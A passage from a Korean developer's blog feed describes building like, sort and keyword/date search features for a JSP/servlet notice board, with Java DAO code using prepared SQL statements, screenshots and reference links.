<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" and (gen_time &gt; ? and gen_time &lt; ?)"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 0. 조회수 정렬</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by views desc, gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 1. 생성일 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">2</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 2. 제목 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by title,gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">3</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 3. 작성자 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by username, gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 4. 좋아요 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by count desc, gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 0번째 부터 5개의 자료만 출력해라.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"OFFSET ? ROWS FETCH NEXT ? ROWS ONLY"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
</code></pre></div></div>

<h3 id="결과">결과</h3>
<ul>
  <li>날짜순 으로 정렬하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5f39dd10-c2be-44c0-b8f9-b2bc4f0b0980" alt="Pasted image 20230604164430" /></li>
  <li>제목순 으로 정렬하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/be54b89d-5ec3-4f04-8b6c-721aac72779b" alt="Pasted image 20230604164519" /></li>
  <li>작성자명순으로 정렬하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8988a4d7-eaa4-474a-8e50-0c8d4c2e2088" alt="Pasted image 20230604164547" /></li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수로 정렬하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/cd05062d-abd4-42bb-a711-5b1c298b5f82" alt="Pasted image 20230604164629" /></li>
  <li>조회수로 정렬하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a0ef88a0-e600-4c92-85a6-53885a2af983" alt="Pasted image 20230604165515" /></li>
</ul>

<h2 id="후기">후기</h2>
<ul>
  <li>직접 좋아요 기능을 구현해 보니 db 테이블을 어떻게 활용해야하는지 알 수 있는 좋은 계기가 되었다. 외래키(foregin)를 사용하여 테이블을 만들면 외래키로 사용된 데이터가 있는 테이블 데이터를 삭제할 때 외래키를 이용하여 만든 테이블 부터 삭제해야되는 것을 직접 경험해 볼 수 있었다. 그렇지않으면 무결성 위배 오류가 발생한다. 그리고 게시글 정렬 기능을 만들 때도 <code class="language-plaintext highlighter-rouge">left join</code> 이 어떻게 동작되는지 직접 확인해 볼 수 있었다. 여러모로 좋아요 기능과 정렬 기능 만드는 것은 좋은 경험이 된 것 같다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://codingbroker.tistory.com/55">HTML, CSS css로 하트 만드는 방법 - before, after (tistory.com)</a></li>
  <li><a href="https://sudo-minz.tistory.com/60">게시글 좋아요 기능 구현(좋아요 조회, 좋아요 판별) (tistory.com)</a></li>
  <li><a href="http://www.homejjang.com/05/RadioButton.php">라디오버튼(Radio Button) - HTML 고급 강좌 (homejjang.com)</a></li>
  <li><a href="https://velog.io/@garcon/%EB%AC%B8%EC%A0%9C-%ED%95%B4%EA%B2%B0-fetch%EB%A1%9C-%EB%B0%9B%EC%95%84%EC%98%A8-%EB%8D%B0%EC%9D%B4%ED%84%B0%EC%97%90-.json-%EB%A9%94%EC%84%9C%EB%93%9C%EB%A5%BC-%EC%82%AC%EC%9A%A9%ED%95%98%EB%A9%B4-undefined%EB%A1%9C-%EB%82%98%ED%83%80%EB%82%98%EB%8A%94-%EB%AC%B8%EC%A0%9C">문제 해결 fetch로 받아온 데이터에 .json() 메서드를 사용하면 undefined로 나타나는 문제 (velog.io)</a></li>
  <li><a href="https://lynmp.com/ko/article/de811c9dc5fj">MySQL 중복값 갯수와 각각의 값 구하기 - LYNMP</a></li>
  <li><a href="https://hongong.hanbit.co.kr/sql-%EA%B8%B0%EB%B3%B8-%EB%AC%B8%EB%B2%95-joininner-outer-cross-self-join/">SQL 기본 문법: JOIN(INNER, OUTER, CROSS, SELF JOIN) (hanbit.co.kr)</a></li>
  <li><a href="https://mingggu.tistory.com/83">ORDER BY 여러개 사용 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="jsp" /><category term="servlet" /><category term="sql" /><category term="oracle db" /><category term="java" /><summary type="html"><![CDATA[게시글 좋아요 및 정렬 기능을 만들어 보았다.]]></summary></entry><entry><title type="html">웹 서버 만들기(14) 게시글 검색 기능 및 날짜 지정 검색</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C14/" rel="alternate" type="text/html" title="웹 서버 만들기(14) 게시글 검색 기능 및 날짜 지정 검색" /><published>2023-06-02T00:00:00+09:00</published><updated>2023-06-02T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C14</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C14/"><![CDATA[<h2 id="게시글-검색-기능">게시글 검색 기능</h2>

<h3 id="목표">목표</h3>
<ul>
  <li>제목, 작성자, 내용, 제목+내용 을 유형으로 검색을 시도한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/dc3f1f33-88b1-4c17-bac6-0436a079bf3b" alt="Pasted image 20230602023619" /></li>
  <li>각 유형을 선택하고 검색을 시도하면 유형에 따라 검색문과 일치하는 결과의 게시글들을 보여준다.</li>
</ul>

<h3 id="유형-선택창">유형 선택창</h3>
<ul>
  <li>제목, 작성자, 내용, 제목+내용의 유형들로 선택창을 만들어 주었다.</li>
  <li>기본으로 선택되어 있는 유형은 <code class="language-plaintext highlighter-rouge">제목+내용</code> 이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/997ca3c5-7018-4332-9a2c-ca3c5c7082a3" alt="Pasted image 20230602025353" /></li>
  <li>유형을 선택하여 검색을 진행한다.</li>
</ul>

<h3 id="jsp-코드">JSP 코드</h3>

<h4 id="notice_boardjsp">notice_board.jsp</h4>
<ul>
  <li>servlet 에서 넘겨받은 optionVal 값을 이용하여 검색한 후에도 선택한 값을 계속 유지하여준다.</li>
  <li>id가 <code class="language-plaintext highlighter-rouge">searchForm</code> 인 form이 submit할 때 선택된 유형도 파라미터에 넣어저 서버로 요청을 보내게된다.<br /><code class="language-plaintext highlighter-rouge">?option_val=1&amp;page=1&amp;q=</code></li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;select</span> <span class="na">name=</span><span class="s">"option_val"</span> <span class="na">form=</span><span class="s">"searchForm"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"1"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">selected</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>제목+내용<span class="nt">&lt;/option&gt;</span>
    <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"2"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">selected</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>작성자<span class="nt">&lt;/option&gt;</span>
    <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"3"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">3</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">selected</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>제목<span class="nt">&lt;/option&gt;</span>
    <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"4"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">4</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">selected</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>내용<span class="nt">&lt;/option&gt;</span>
<span class="nt">&lt;/select&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">id=</span><span class="s">"searchForm"</span><span class="nt">&gt;</span>
... 생략 ...
</code></pre></div></div>

<ul>
  <li>
    <p>검색 전<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b9ac62a4-f428-4222-83fc-9bb848f97043" alt="Pasted image 20230602025138" /></p>
  </li>
  <li>
    <p>검색 후<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/06390675-9cc8-43ae-8b7e-e892596b44de" alt="Pasted image 20230602025225" /></p>
  </li>
</ul>

<h3 id="servlet-코드--java-코드-">Servlet 코드 ( Java 코드 )</h3>

<h4 id="mainpagejava">MainPage.java</h4>
<ul>
  <li>사용자에게서 받은 option 값이 1~4 범위의 수인지 검사한다.</li>
  <li>option 값과 검색문 값을 이용하여 게시글 수와 게시글 목록을 받아온다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
		<span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoard</span><span class="o">)){</span>
			<span class="c1">// 검색 옵션 option_val</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 1 제목+내용</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 2 작성자</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 3 제목</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 4 내용</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">ov</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"option_val"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">optionVal</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">optionVal</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">ov</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">optionVal</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">optionVal</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">optionVal</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 결과 총 게시글 수 알아보기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="n">noticeBoardDAO</span><span class="o">.</span><span class="na">getCount</span><span class="o">(</span><span class="n">optionVal</span><span class="o">,</span><span class="n">q</span><span class="o">,</span> <span class="n">from</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 데이터 가져오기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">array</span> <span class="o">=</span> <span class="n">noticeBoardDAO</span><span class="o">.</span><span class="na">getNoticeList</span><span class="o">(</span><span class="n">optionVal</span><span class="o">,</span><span class="n">q</span><span class="o">,</span><span class="n">start</span><span class="o">,</span><span class="n">number</span><span class="o">,</span> <span class="n">from</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 옵션 값 jsp 로 보내기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"optionVal"</span><span class="o">,</span> <span class="n">optionVal</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span>
</code></pre></div></div>

<h4 id="noticeboarddaojava">NoticeBoardDAO.java</h4>
<ul>
  <li>옵션에 맞는 쿼리문을 만들어 DB 게시글 테이블에서 게시글 목록을 가져온다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 전체 목록 가져오기 or 검색 목록 가져오기</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 1 &lt;= optionVal &lt;= 4</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 1 제목 + 내용</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 2 작성자</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 3 제목</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 4 내용</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 날짜 범위</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Notice</span><span class="o">&gt;</span> <span class="nf">getNoticeList</span><span class="o">(</span><span class="kt">int</span> <span class="n">optionVal</span><span class="o">,</span><span class="nc">String</span> <span class="n">question</span><span class="o">,</span> <span class="kt">int</span> <span class="n">start</span><span class="o">,</span> <span class="kt">int</span> <span class="n">number</span><span class="o">,</span> <span class="kt">long</span> <span class="n">from</span><span class="o">,</span> <span class="kt">long</span> <span class="n">to</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">optionVal</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">optionVal</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Notice</span><span class="o">&gt;();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select * from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%' or main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">2</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (username like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">3</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" and (gen_time &gt; ? and gen_time &lt; ?)"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 0번째 부터 5개의 자료만 출력해라.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"OFFSET ? ROWS FETCH NEXT ? ROWS ONLY"</span><span class="o">);</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="n">from</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">4</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">5</span><span class="o">,</span> <span class="n">start</span><span class="o">);</span>
